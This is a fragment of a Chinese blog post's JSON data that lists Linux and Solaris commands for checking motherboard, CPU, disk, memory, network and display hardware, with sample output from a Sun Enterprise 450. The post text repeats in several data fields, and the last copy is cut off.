-------------------------------------------------- #通过/proc文件系统 <br />1) cat /proc/cpuinfo #通过查看开机信息 <br />2) dmesg | grep -i 'cpu' # 3)dmidecode -t processor --------------------------------------------------</p><p>3, 硬盘信息 -------------------------------------------------- #查看分区情况 fdisk -l #查看大小情况 df -h #查看使用情况 du -h # hdparm -I /dev/sda # dmesg | grep sda --------------------------------------------------</p><p>4, 内存信息 -------------------------------------------------- 1) cat /proc/meminfo 2) dmesg | grep mem <br />3) free -m <br />4) vmstat <br />5) dmidecode | grep -i mem --------------------------------------------------</p><p>5, 网卡信息 -------------------------------------------------- <br />1) dmesg | grep -i 'eth' <br />2) cat /etc/sysconfig/hwconf | grep -i eth 3) lspci | grep -i 'eth' --------------------------------------------------</p><p>6, 鼠标键盘和USB信息查看键盘和鼠标：<br />cat /proc/bus/input/devices <br />查看USB设备：<br />cat /proc/bus/usb/devices <br />查看各设备的中断请求(IRQ):<br />cat /proc/interrupts</p><p>7, 显卡信息 -------------------------------------------------- <br />1)lspci |grep -i 'VGA' 2)dmesg | grep -i 'VGA' --------------------------------------------------</p><p>8, 声卡信息 -------------------------------------------------- <br />1)lspci |grep -i 'VGA' 2)dmesg | grep -i 'VGA' --------------------------------------------------</p><p>9, 其他命令 .用硬件检测程序kuduz探测新硬件：<br />service kudzu start ( or restart) .dmesg (查看所有启动时检测到的硬件信息) .<br />lspci (显示外设信息, 如usb，网卡等信息) .<br />cat /etc/sysconfig/hwconf .mpstat</p><p>10, 需要手动安装的工具 lshw,hwinfo,hal-device-manager</p><p>Solaris如何检测硬件参数 俺从别处发现了些有意思的东西：<br />Solaris的硬件相关命令<br />1)．查看当前处理器的类型和速度(主频) <br /># psrinfo –v </p><p>Status of processor 1 as of: 11/24/01 10:34:41 Processor has been on-line since 11/24/01 10:18:20. The sparcv9 processor operates at 432 MHz, and has a sparcv9 floating point processor. Status of processor 3 as of: 11/24/01 10:34:41 Processor has been on-line since 11/24/01 10:18:22. The sparcv9 processor operates at 432 MHz, and has a sparcv9 floating point processor.</p><p>2)．打印当前的OBP版本号<br /># prtconf –V </p><p>OBP 3.20.0 2000/10/24 10:47 <br /># /usr/platform/sun4u/sbin/prtdiag –v | grep OBP </p><p>OBP 3.20.0 2000/10/24 10:47 POST 6.1.0 2000/10/24 10:49 ok. .version Release 3.20 Version 0 created 2000/10/24 10:47 OBP 3.20.0 2000/10/24 10:47 POST 6.1.0 2000/10/24 10:49 OBDIAG 4.5.1 2000/10/24 10:48</p><p>3)．查看硬盘物理信息(vendor, RPM, Capacity) <br /># iostat –E <br />sd0 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: SEAGATE Product: ST34371W SUN4.2G Revision: 7462 Serial No: JDX394220KW EBC Size: 4.29GB &lt;4292075520 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd2 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: FUJITSU Product: MAJ3364M SUN36G Revision: 0804 Serial No: 01M18144 Size: 36.42GB &lt;36418595328 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd3 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: FUJITSU Product: MAJ3364M SUN36G Revision: 0804 Serial No: 01M16199 Size: 36.42GB &lt;36418595328 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd21 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: TOSHIBA Product: DVD-ROM SD-M1401 Revision: 1007 Serial No: 06/22/00 Size: 18446744073.71GB &lt;-1 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0</p><p>4)．查看磁盘的几何参数和分区信息<br /># prtvtoc <br />/dev/rdsk/c0t0d0s0 * /dev/rdsk/c0t0d0s0 partition map * * Dimensions: * 512 bytes/sector * 135 sectors/track * 16 tracks/cylinder * 2160 sectors/cylinder * 3882 cylinders * 3880 accessible cylinders * * Flags: * 1: unmountable * 10: read-only * * Unallocated space: * First Sector Last * Sector Count Sector * 8277120 103680 8380799 * * First Sector Last * Partition Tag Flags Sector Count Sector Mount Directory 0 2 00 0 2049840 2049839 / 1 3 01 2049840 615600 2665439 2 5 00 0 8380800 8380799 5 0 00 2665440 2458080 5123519 /opt 6 4 00 5123520 3073680 8197199 /usr 7 8 00 8197200 79920 8277119 /export/home</p><p>5)．显示已经使用和未使用的i-node数目 <br /># df –F ufs –o i </p><p>Filesystem iused ifree %iused Mounted on /dev/dsk/c0t0d0s0 7859 479821 2% / /dev/dsk/c0t0d0s6 37763 339517 10% /usr /dev/dsk/c0t0d0s5 722 301102 0% /opt /dev/dsk/c0t0d0s7 4 24380 0% /export/home</p><p>6).显示cpu使用率最高的进程 <br /># ps –eo pid,pcpu,args | sort +1n </p><p>该命令输出当前系统进程的pid, CPU占用率及命令描述，并以pcpu来排序</p><p>7)．显示内存占用率最高的进程 <br /># ps –eo pid,vsz,args | sort +1n </p><p>该命令输出当前系统进程的pid，内存占用率及命令描述，并以vsz来排序</p><p>8)．查看及启动系统的32位或64位内核模式 64位模式 <br /># isalist –v </p><p>sparcv9+vis sparcv9 sparcv8plus+vis sparcv8plus sparcv8 sparcv8-fsmuld sparcv7 sparc <br /># isainfo –v </p><p>64-bit sparcv9 applications 32-bit sparc applications <br /># isainfo –b </p><p>64 启动64位内核模式 ok. boot kernel/sparcv9/unix 32位模式 <br /># isalist –v&nbsp;</p><p>sparcv8plus+vis sparcv8plus sparcv8 sparcv8-fsmuld sparcv7 sparc <br /># isainfo –v </p><p>32-bit sparc applications <br /># isainfo –b </p><p>32 启动32位模式 ok. boot kernel/unix</p><p>9)．查看当前的OpenWindows版本 <br /># showrev –w </p><p>OpenWindows version: X11 Version 6.4.1 5 November 2001</p><p>10)．查看当前CDE的版本 <br /># /usr/ccs/bin/what /usr/dt/bin/dtmail&nbsp;</p><p>/usr/dt/bin/dtmail: CDE Version 1.4.6_06 CDEVersion1.4.6_06</p><p>11)．测定当前的显示器刷新频率 </p><p>/usr/sbin/ffbconfig –rev </p><p>Valid values for -res option are: 1024x768x60 [1] 1024x768x70 [1] 1024x768x75 [1] [2] 1024x768x77 1024x800x84 1152x900x66 1152x900x76 1280x800x76 [1] [2] 1280x1024x60 [1] [2] 1280x1024x67 1280x1024x76 1280x1024x85 [1] [2] 960x680x112s 960x680x108s 640x480x60 [1] [2] 640x480x60i [1] 768x575x50i [1] 1440x900x76 [1] [2] 1600x1000x66 [1] [2] 1600x1000x76 [1] [2] 1600x1280x76 [1] [2] 1920x1080x72 [1] [2] 1920x1080x76 [1] [2] 1920x1200x70 [1] [2] 1920x1200x75 [1] [2] svga [1] 1152 1280 stereo vga [1] [2] ntsc [1] pal [1] none Notes: [1] monitor does not support this resolution. [2] this version of FFB (FFB1) does not support this resolution</p><p>12)．查看系统配置 <br /># /usr/platform/sun4u/sbin/prtdiag –v&nbsp;</p><p>System Configuration: Sun Microsystems sun4u Sun Enterprise 450 (2 X UltraSPAR C-II 432MHz) System clock frequency: 86 MHz Memory size: 1024 Megabytes ========================= CPUs ========================= Run Ecache CPU CPU Brd CPU Module MHz MB Impl. Mask --More-- --- --- ------- ----- ------ ------ ---- SYS 1 1 432 4.0 US-II 10.0 SYS 3 3 432 4.0 US-II 10.0 ========================= Memory ========================= Interlv. Socket Size Bank Group Name (MB) Status ---- ----- ------ ---- ------ 0 none 1901 256 OK 0 none 1902 256 OK 0 none 1903 256 OK 0 none 1904 256 OK 0 none 1701 256 OK 0 none 1702 256 OK ========================= IO Cards ========================= No failures found in Sys\ntem =========================== ========================= Environmental Status ========================= System Temperatures (Celsius): ------------------------------</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>ps：做系统移植的时候，非常有用。网卡芯片什么的，驱动也好移植。</p>","source":"_posts/linux应用--硬件信息查看[转].md","raw":"title: linux应用--硬件信息查看[转]\ncategories: [Linux]\ntags: []\ndate: 2010-12-08 22:38:00\n---\n<p></p><p></p> <ins><ins></ins></ins> <p>linux应用--硬件信息查看</p><p>真乱---整理下、、、<br />1, 主板信息 .查看主板的序列号 -------------------------------------------------- #使用<a href=\"http://www.net527.cn/a/luyoujiaohuan/\"><u>命令</u></a> dmidecode | grep -i 'serial number' #查看板卡信息 cat /proc/pci --------------------------------------------------</p><p>2, cpu信息 -------------------------------------------------- #通过/proc文件系统 <br />1) cat /proc/cpuinfo #通过查看开机信息 <br />2) dmesg | grep -i 'cpu' # 3)dmidecode -t processor --------------------------------------------------</p><p>3, 硬盘信息 -------------------------------------------------- #查看分区情况 fdisk -l #查看大小情况 df -h #查看使用情况 du -h # hdparm -I /dev/sda # dmesg | grep sda --------------------------------------------------</p><p>4, 内存信息 -------------------------------------------------- 1) cat /proc/meminfo 2) dmesg | grep mem <br />3) free -m <br />4) vmstat <br />5) dmidecode | grep -i mem --------------------------------------------------</p><p>5, 网卡信息 -------------------------------------------------- <br />1) dmesg | grep -i 'eth' <br />2) cat /etc/sysconfig/hwconf | grep -i eth 3) lspci | grep -i 'eth' --------------------------------------------------</p><p>6, 鼠标键盘和USB信息查看键盘和鼠标：<br />cat /proc/bus/input/devices <br />查看USB设备：<br />cat /proc/bus/usb/devices <br />查看各设备的中断请求(IRQ):<br />cat /proc/interrupts</p><p>7, 显卡信息 -------------------------------------------------- <br />1)lspci |grep -i 'VGA' 2)dmesg | grep -i 'VGA' --------------------------------------------------</p><p>8, 声卡信息 -------------------------------------------------- <br />1)lspci |grep -i 'VGA' 2)dmesg | grep -i 'VGA' --------------------------------------------------</p><p>9, 其他命令 .用硬件检测程序kuduz探测新硬件：<br />service kudzu start ( or restart) .dmesg (查看所有启动时检测到的硬件信息) .<br />lspci (显示外设信息, 如usb，网卡等信息) .<br />cat /etc/sysconfig/hwconf .mpstat</p><p>10, 需要手动安装的工具 lshw,hwinfo,hal-device-manager</p><p>Solaris如何检测硬件参数 俺从别处发现了些有意思的东西：<br />Solaris的硬件相关命令<br />1)．查看当前处理器的类型和速度(主频) <br /># psrinfo –v </p><p>Status of processor 1 as of: 11/24/01 10:34:41 Processor has been on-line since 11/24/01 10:18:20. The sparcv9 processor operates at 432 MHz, and has a sparcv9 floating point processor. Status of processor 3 as of: 11/24/01 10:34:41 Processor has been on-line since 11/24/01 10:18:22. The sparcv9 processor operates at 432 MHz, and has a sparcv9 floating point processor.</p><p>2)．打印当前的OBP版本号<br /># prtconf –V </p><p>OBP 3.20.0 2000/10/24 10:47 <br /># /usr/platform/sun4u/sbin/prtdiag –v | grep OBP </p><p>OBP 3.20.0 2000/10/24 10:47 POST 6.1.0 2000/10/24 10:49 ok. .version Release 3.20 Version 0 created 2000/10/24 10:47 OBP 3.20.0 2000/10/24 10:47 POST 6.1.0 2000/10/24 10:49 OBDIAG 4.5.1 2000/10/24 10:48</p><p>3)．查看硬盘物理信息(vendor, RPM, Capacity) <br /># iostat –E <br />sd0 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: SEAGATE Product: ST34371W SUN4.2G Revision: 7462 Serial No: JDX394220KW EBC Size: 4.29GB &lt;4292075520 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd2 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: FUJITSU Product: MAJ3364M SUN36G Revision: 0804 Serial No: 01M18144 Size: 36.42GB &lt;36418595328 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd3 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: FUJITSU Product: MAJ3364M SUN36G Revision: 0804 Serial No: 01M16199 Size: 36.42GB &lt;36418595328 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd21 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: TOSHIBA Product: DVD-ROM SD-M1401 Revision: 1007 Serial No: 06/22/00 Size: 18446744073.71GB &lt;-1 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0</p><p>4)．查看磁盘的几何参数和分区信息<br /># prtvtoc <br />/dev/rdsk/c0t0d0s0 * /dev/rdsk/c0t0d0s0 partition map * * Dimensions: * 512 bytes/sector * 135 sectors/track * 16 tracks/cylinder * 2160 sectors/cylinder * 3882 cylinders * 3880 accessible cylinders * * Flags: * 1: unmountable * 10: read-only * * Unallocated space: * First Sector Last * Sector Count Sector * 8277120 103680 8380799 * * First Sector Last * Partition Tag Flags Sector Count Sector Mount Directory 0 2 00 0 2049840 2049839 / 1 3 01 2049840 615600 2665439 2 5 00 0 8380800 8380799 5 0 00 2665440 2458080 5123519 /opt 6 4 00 5123520 3073680 8197199 /usr 7 8 00 8197200 79920 8277119 /export/home</p><p>5)．显示已经使用和未使用的i-node数目 <br /># df –F ufs –o i </p><p>Filesystem iused ifree %iused Mounted on /dev/dsk/c0t0d0s0 7859 479821 2% / /dev/dsk/c0t0d0s6 37763 339517 10% /usr /dev/dsk/c0t0d0s5 722 301102 0% /opt /dev/dsk/c0t0d0s7 4 24380 0% /export/home</p><p>6).显示cpu使用率最高的进程 <br /># ps –eo pid,pcpu,args | sort +1n </p><p>该命令输出当前系统进程的pid, CPU占用率及命令描述，并以pcpu来排序</p><p>7)．显示内存占用率最高的进程 <br /># ps –eo pid,vsz,args | sort +1n </p><p>该命令输出当前系统进程的pid，内存占用率及命令描述，并以vsz来排序</p><p>8)．查看及启动系统的32位或64位内核模式 64位模式 <br /># isalist –v </p><p>sparcv9+vis sparcv9 sparcv8plus+vis sparcv8plus sparcv8 sparcv8-fsmuld sparcv7 sparc <br /># isainfo –v </p><p>64-bit sparcv9 applications 32-bit sparc applications <br /># isainfo –b </p><p>64 启动64位内核模式 ok. boot kernel/sparcv9/unix 32位模式 <br /># isalist –v&nbsp;</p><p>sparcv8plus+vis sparcv8plus sparcv8 sparcv8-fsmuld sparcv7 sparc <br /># isainfo –v </p><p>32-bit sparc applications <br /># isainfo –b </p><p>32 启动32位模式 ok. boot kernel/unix</p><p>9)．查看当前的OpenWindows版本 <br /># showrev –w </p><p>OpenWindows version: X11 Version 6.4.1 5 November 2001</p><p>10)．查看当前CDE的版本 <br /># /usr/ccs/bin/what /usr/dt/bin/dtmail&nbsp;</p><p>/usr/dt/bin/dtmail: CDE Version 1.4.6_06 CDEVersion1.4.6_06</p><p>11)．测定当前的显示器刷新频率 </p><p>/usr/sbin/ffbconfig –rev </p><p>Valid values for -res option are: 1024x768x60 [1] 1024x768x70 [1] 1024x768x75 [1] [2] 1024x768x77 1024x800x84 1152x900x66 1152x900x76 1280x800x76 [1] [2] 1280x1024x60 [1] [2] 1280x1024x67 1280x1024x76 1280x1024x85 [1] [2] 960x680x112s 960x680x108s 640x480x60 [1] [2] 640x480x60i [1] 768x575x50i [1] 1440x900x76 [1] [2] 1600x1000x66 [1] [2] 1600x1000x76 [1] [2] 1600x1280x76 [1] [2] 1920x1080x72 [1] [2] 1920x1080x76 [1] [2] 1920x1200x70 [1] [2] 1920x1200x75 [1] [2] svga [1] 1152 1280 stereo vga [1] [2] ntsc [1] pal [1] none Notes: [1] monitor does not support this resolution. [2] this version of FFB (FFB1) does not support this resolution</p><p>12)．查看系统配置 <br /># /usr/platform/sun4u/sbin/prtdiag –v&nbsp;</p><p>System Configuration: Sun Microsystems sun4u Sun Enterprise 450 (2 X UltraSPAR C-II 432MHz) System clock frequency: 86 MHz Memory size: 1024 Megabytes ========================= CPUs ========================= Run Ecache CPU CPU Brd CPU Module MHz MB Impl. Mask --More-- --- --- ------- ----- ------ ------ ---- SYS 1 1 432 4.0 US-II 10.0 SYS 3 3 432 4.0 US-II 10.0 ========================= Memory ========================= Interlv. Socket Size Bank Group Name (MB) Status ---- ----- ------ ---- ------ 0 none 1901 256 OK 0 none 1902 256 OK 0 none 1903 256 OK 0 none 1904 256 OK 0 none 1701 256 OK 0 none 1702 256 OK ========================= IO Cards ========================= No failures found in Sys\ntem =========================== ========================= Environmental Status ========================= System Temperatures (Celsius): ------------------------------</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>ps：做系统移植的时候，非常有用。网卡芯片什么的，驱动也好移植。</p>","slug":"linux应用--硬件信息查看[转]","published":1,"updated":"2023-04-22T05:38:44.818Z","_id":"clgrjlxhy004c7opi7ksw3toq","comments":1,"layout":"post","photos":[],"link":"","content":"<p></p><p></p> <ins><ins></ins></ins> <p>linux应用--硬件信息查看</p><p>真乱---整理下、、、<br />1, 主板信息 .查看主板的序列号 -------------------------------------------------- #使用<a href=\"http://www.net527.cn/a/luyoujiaohuan/\"><u>命令</u></a> dmidecode | grep -i 'serial number' #查看板卡信息 cat /proc/pci --------------------------------------------------</p><p>2, cpu信息 -------------------------------------------------- #通过/proc文件系统 <br />1) cat /proc/cpuinfo #通过查看开机信息 <br />2) dmesg | grep -i 'cpu' # 3)dmidecode -t processor --------------------------------------------------</p><p>3, 硬盘信息 -------------------------------------------------- #查看分区情况 fdisk -l #查看大小情况 df -h #查看使用情况 du -h # hdparm -I /dev/sda # dmesg | grep sda --------------------------------------------------</p><p>4, 内存信息 -------------------------------------------------- 1) cat /proc/meminfo 2) dmesg | grep mem <br />3) free -m <br />4) vmstat <br />5) dmidecode | grep -i mem --------------------------------------------------</p><p>5, 网卡信息 -------------------------------------------------- <br />1) dmesg | grep -i 'eth' <br />2) cat /etc/sysconfig/hwconf | grep -i eth 3) lspci | grep -i 'eth' --------------------------------------------------</p><p>6, 鼠标键盘和USB信息查看键盘和鼠标：<br />cat /proc/bus/input/devices <br />查看USB设备：<br />cat /proc/bus/usb/devices <br />查看各设备的中断请求(IRQ):<br />cat /proc/interrupts</p><p>7, 显卡信息 -------------------------------------------------- <br />1)lspci |grep -i 'VGA' 2)dmesg | grep -i 'VGA' --------------------------------------------------</p><p>8, 声卡信息 -------------------------------------------------- <br />1)lspci |grep -i 'VGA' 2)dmesg | grep -i 'VGA' --------------------------------------------------</p><p>9, 其他命令 .用硬件检测程序kuduz探测新硬件：<br />service kudzu start ( or restart) .dmesg (查看所有启动时检测到的硬件信息) .<br />lspci (显示外设信息, 如usb，网卡等信息) .<br />cat /etc/sysconfig/hwconf .mpstat</p><p>10, 需要手动安装的工具 lshw,hwinfo,hal-device-manager</p><p>Solaris如何检测硬件参数 俺从别处发现了些有意思的东西：<br />Solaris的硬件相关命令<br />1)．查看当前处理器的类型和速度(主频) <br /># psrinfo –v </p><p>Status of processor 1 as of: 11/24/01 10:34:41 Processor has been on-line since 11/24/01 10:18:20. The sparcv9 processor operates at 432 MHz, and has a sparcv9 floating point processor. Status of processor 3 as of: 11/24/01 10:34:41 Processor has been on-line since 11/24/01 10:18:22. The sparcv9 processor operates at 432 MHz, and has a sparcv9 floating point processor.</p><p>2)．打印当前的OBP版本号<br /># prtconf –V </p><p>OBP 3.20.0 2000/10/24 10:47 <br /># /usr/platform/sun4u/sbin/prtdiag –v | grep OBP </p><p>OBP 3.20.0 2000/10/24 10:47 POST 6.1.0 2000/10/24 10:49 ok. .version Release 3.20 Version 0 created 2000/10/24 10:47 OBP 3.20.0 2000/10/24 10:47 POST 6.1.0 2000/10/24 10:49 OBDIAG 4.5.1 2000/10/24 10:48</p><p>3)．查看硬盘物理信息(vendor, RPM, Capacity) <br /># iostat –E <br />sd0 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: SEAGATE Product: ST34371W SUN4.2G Revision: 7462 Serial No: JDX394220KW EBC Size: 4.29GB &lt;4292075520 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd2 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: FUJITSU Product: MAJ3364M SUN36G Revision: 0804 Serial No: 01M18144 Size: 36.42GB &lt;36418595328 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd3 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: FUJITSU Product: MAJ3364M SUN36G Revision: 0804 Serial No: 01M16199 Size: 36.42GB &lt;36418595328 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd21 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: TOSHIBA Product: DVD-ROM SD-M1401 Revision: 1007 Serial No: 06/22/00 Size: 18446744073.71GB &lt;-1 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0</p><p>4)．查看磁盘的几何参数和分区信息<br /># prtvtoc <br />/dev/rdsk/c0t0d0s0 * /dev/rdsk/c0t0d0s0 partition map * * Dimensions: * 512 bytes/sector * 135 sectors/track * 16 tracks/cylinder * 2160 sectors/cylinder * 3882 cylinders * 3880 accessible cylinders * * Flags: * 1: unmountable * 10: read-only * * Unallocated space: * First Sector Last * Sector Count Sector * 8277120 103680 8380799 * * First Sector Last * Partition Tag Flags Sector Count Sector Mount Directory 0 2 00 0 2049840 2049839 / 1 3 01 2049840 615600 2665439 2 5 00 0 8380800 8380799 5 0 00 2665440 2458080 5123519 /opt 6 4 00 5123520 3073680 8197199 /usr 7 8 00 8197200 79920 8277119 /export/home</p><p>5)．显示已经使用和未使用的i-node数目 <br /># df –F ufs –o i </p><p>Filesystem iused ifree %iused Mounted on /dev/dsk/c0t0d0s0 7859 479821 2% / /dev/dsk/c0t0d0s6 37763 339517 10% /usr /dev/dsk/c0t0d0s5 722 301102 0% /opt /dev/dsk/c0t0d0s7 4 24380 0% /export/home</p><p>6).显示cpu使用率最高的进程 <br /># ps –eo pid,pcpu,args | sort +1n </p><p>该命令输出当前系统进程的pid, CPU占用率及命令描述，并以pcpu来排序</p><p>7)．显示内存占用率最高的进程 <br /># ps –eo pid,vsz,args | sort +1n </p><p>该命令输出当前系统进程的pid，内存占用率及命令描述，并以vsz来排序</p><p>8)．查看及启动系统的32位或64位内核模式 64位模式 <br /># isalist –v </p><p>sparcv9+vis sparcv9 sparcv8plus+vis sparcv8plus sparcv8 sparcv8-fsmuld sparcv7 sparc <br /># isainfo –v </p><p>64-bit sparcv9 applications 32-bit sparc applications <br /># isainfo –b </p><p>64 启动64位内核模式 ok. boot kernel/sparcv9/unix 32位模式 <br /># isalist –v&nbsp;</p><p>sparcv8plus+vis sparcv8plus sparcv8 sparcv8-fsmuld sparcv7 sparc <br /># isainfo –v </p><p>32-bit sparc applications <br /># isainfo –b </p><p>32 启动32位模式 ok. boot kernel/unix</p><p>9)．查看当前的OpenWindows版本 <br /># showrev –w </p><p>OpenWindows version: X11 Version 6.4.1 5 November 2001</p><p>10)．查看当前CDE的版本 <br /># /usr/ccs/bin/what /usr/dt/bin/dtmail&nbsp;</p><p>/usr/dt/bin/dtmail: CDE Version 1.4.6_06 CDEVersion1.4.6_06</p><p>11)．测定当前的显示器刷新频率 </p><p>/usr/sbin/ffbconfig –rev </p><p>Valid values for -res option are: 1024x768x60 [1] 1024x768x70 [1] 1024x768x75 [1] [2] 1024x768x77 1024x800x84 1152x900x66 1152x900x76 1280x800x76 [1] [2] 1280x1024x60 [1] [2] 1280x1024x67 1280x1024x76 1280x1024x85 [1] [2] 960x680x112s 960x680x108s 640x480x60 [1] [2] 640x480x60i [1] 768x575x50i [1] 1440x900x76 [1] [2] 1600x1000x66 [1] [2] 1600x1000x76 [1] [2] 1600x1280x76 [1] [2] 1920x1080x72 [1] [2] 1920x1080x76 [1] [2] 1920x1200x70 [1] [2] 1920x1200x75 [1] [2] svga [1] 1152 1280 stereo vga [1] [2] ntsc [1] pal [1] none Notes: [1] monitor does not support this resolution. [2] this version of FFB (FFB1) does not support this resolution</p><p>12)．查看系统配置 <br /># /usr/platform/sun4u/sbin/prtdiag –v&nbsp;</p><p>System Configuration: Sun Microsystems sun4u Sun Enterprise 450 (2 X UltraSPAR C-II 432MHz) System clock frequency: 86 MHz Memory size: 1024 Megabytes ========================= CPUs ========================= Run Ecache CPU CPU Brd CPU Module MHz MB Impl. Mask --More-- --- --- ------- ----- ------ ------ ---- SYS 1 1 432 4.0 US-II 10.0 SYS 3 3 432 4.0 US-II 10.0 ========================= Memory ========================= Interlv. Socket Size Bank Group Name (MB) Status ---- ----- ------ ---- ------ 0 none 1901 256 OK 0 none 1902 256 OK 0 none 1903 256 OK 0 none 1904 256 OK 0 none 1701 256 OK 0 none 1702 256 OK ========================= IO Cards ========================= No failures found in Sys\ntem =========================== ========================= Environmental Status ========================= System Temperatures (Celsius): ------------------------------</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>ps：做系统移植的时候，非常有用。网卡芯片什么的，驱动也好移植。</p>","site":{"data":{}},"excerpt":"","more":"<p></p><p></p> <ins><ins></ins></ins> <p>linux应用--硬件信息查看</p><p>真乱---整理下、、、<br />1, 主板信息 .查看主板的序列号 -------------------------------------------------- #使用<a href=\"http://www.net527.cn/a/luyoujiaohuan/\"><u>命令</u></a> dmidecode | grep -i 'serial number' #查看板卡信息 cat /proc/pci --------------------------------------------------</p><p>2, cpu信息 -------------------------------------------------- #通过/proc文件系统 <br />1) cat /proc/cpuinfo #通过查看开机信息 <br />2) dmesg | grep -i 'cpu' # 3)dmidecode -t processor --------------------------------------------------</p><p>3, 硬盘信息 -------------------------------------------------- #查看分区情况 fdisk -l #查看大小情况 df -h #查看使用情况 du -h # hdparm -I /dev/sda # dmesg | grep sda --------------------------------------------------</p><p>4, 内存信息 -------------------------------------------------- 1) cat /proc/meminfo 2) dmesg | grep mem <br />3) free -m <br />4) vmstat <br />5) dmidecode | grep -i mem --------------------------------------------------</p><p>5, 网卡信息 -------------------------------------------------- <br />1) dmesg | grep -i 'eth' <br />2) cat /etc/sysconfig/hwconf | grep -i eth 3) lspci | grep -i 'eth' --------------------------------------------------</p><p>6, 鼠标键盘和USB信息查看键盘和鼠标：<br />cat /proc/bus/input/devices <br />查看USB设备：<br />cat /proc/bus/usb/devices <br />查看各设备的中断请求(IRQ):<br />cat /proc/interrupts</p><p>7, 显卡信息 -------------------------------------------------- <br />1)lspci |grep -i 'VGA' 2)dmesg | grep -i 'VGA' --------------------------------------------------</p><p>8, 声卡信息 -------------------------------------------------- <br />1)lspci |grep -i 'VGA' 2)dmesg | grep -i 'VGA' --------------------------------------------------</p><p>9, 其他命令 .用硬件检测程序kuduz探测新硬件：<br />service kudzu start ( or restart) .dmesg (查看所有启动时检测到的硬件信息) .<br />lspci (显示外设信息, 如usb，网卡等信息) .<br />cat /etc/sysconfig/hwconf .mpstat</p><p>10, 需要手动安装的工具 lshw,hwinfo,hal-device-manager</p><p>Solaris如何检测硬件参数 俺从别处发现了些有意思的东西：<br />Solaris的硬件相关命令<br />1)．查看当前处理器的类型和速度(主频) <br /># psrinfo –v </p><p>Status of processor 1 as of: 11/24/01 10:34:41 Processor has been on-line since 11/24/01 10:18:20. The sparcv9 processor operates at 432 MHz, and has a sparcv9 floating point processor. Status of processor 3 as of: 11/24/01 10:34:41 Processor has been on-line since 11/24/01 10:18:22. The sparcv9 processor operates at 432 MHz, and has a sparcv9 floating point processor.</p><p>2)．打印当前的OBP版本号<br /># prtconf –V </p><p>OBP 3.20.0 2000/10/24 10:47 <br /># /usr/platform/sun4u/sbin/prtdiag –v | grep OBP </p><p>OBP 3.20.0 2000/10/24 10:47 POST 6.1.0 2000/10/24 10:49 ok. .version Release 3.20 Version 0 created 2000/10/24 10:47 OBP 3.20.0 2000/10/24 10:47 POST 6.1.0 2000/10/24 10:49 OBDIAG 4.5.1 2000/10/24 10:48</p><p>3)．查看硬盘物理信息(vendor, RPM, Capacity) <br /># iostat –E <br />sd0 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: SEAGATE Product: ST34371W SUN4.2G Revision: 7462 Serial No: JDX394220KW EBC Size: 4.29GB &lt;4292075520 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd2 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: FUJITSU Product: MAJ3364M SUN36G Revision: 0804 Serial No: 01M18144 Size: 36.42GB &lt;36418595328 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd3 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: FUJITSU Product: MAJ3364M SUN36G Revision: 0804 Serial No: 01M16199 Size: 36.42GB &lt;36418595328 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0 sd21 Soft Errors: 0 Hard Errors: 0 Transport Errors: 0 Vendor: TOSHIBA Product: DVD-ROM SD-M1401 Revision: 1007 Serial No: 06/22/00 Size: 18446744073.71GB &lt;-1 bytes&gt;; Media Error: 0 Device Not Ready: 0 No Device: 0 Recoverable: 0 Illegal Request: 0 Predictive Failure Analysis: 0</p><p>4)．查看磁盘的几何参数和分区信息<br /># prtvtoc <br />/dev/rdsk/c0t0d0s0 * /dev/rdsk/c0t0d0s0 partition map * * Dimensions: * 512 bytes/sector * 135 sectors/track * 16 tracks/cylinder * 